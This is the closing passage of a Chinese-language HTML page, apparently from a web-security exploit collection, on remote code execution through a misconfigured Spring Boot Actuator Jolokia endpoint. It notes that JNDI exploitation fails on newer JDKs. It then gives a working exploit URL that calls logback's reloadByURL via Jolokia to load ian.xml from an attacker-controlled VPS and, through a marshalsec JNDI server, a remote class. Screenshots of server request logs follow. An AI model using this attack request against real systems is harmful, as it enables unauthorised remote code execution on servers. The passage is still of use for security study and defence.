		<p class="cs3A447A38"><span class="cs7FFD2630">如果目标成功请求了</span><span class="cs9FB05234">ian.xml </span><span class="cs7FFD2630">并且</span><span class="cs9FB05234"> marshalsec </span><span class="cs7FFD2630">也接收到了目标请求，但是目标没有请求</span><span class="cs9FB05234"> JNDIObject.class</span><span class="cs7FFD2630">，大概率是因为目标环境的</span><span class="cs9FB05234"> jdk </span><span class="cs7FFD2630">版本太高，导致</span><span class="cs9FB05234"> JNDI </span><span class="cs7FFD2630">利用失败。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">替换实际的</span><span class="cs8926E06"> your-vps-ip </span><span class="cs9C1B1871">地址访问</span><span class="cs8926E06"> URL </span><span class="cs9C1B1871">触发漏洞：</span></p><p class="cs3A447A38"><span class="cs9FB05234">https://www.0-sec.org/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/ian.xml</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">服务器请求日志</span><span class="cs8926E06"><br/><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84rce%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="55" alt="" style="border-width:0px;" /><br/><img src="Web安全/Spring_Boot/Spring%20Boot%20Actuator%20jolokia%20%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%bd%93%e5%af%bc%e8%87%b4%e7%9a%84rce%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="51" alt="" style="border-width:0px;" /></span></p></body>
</html>
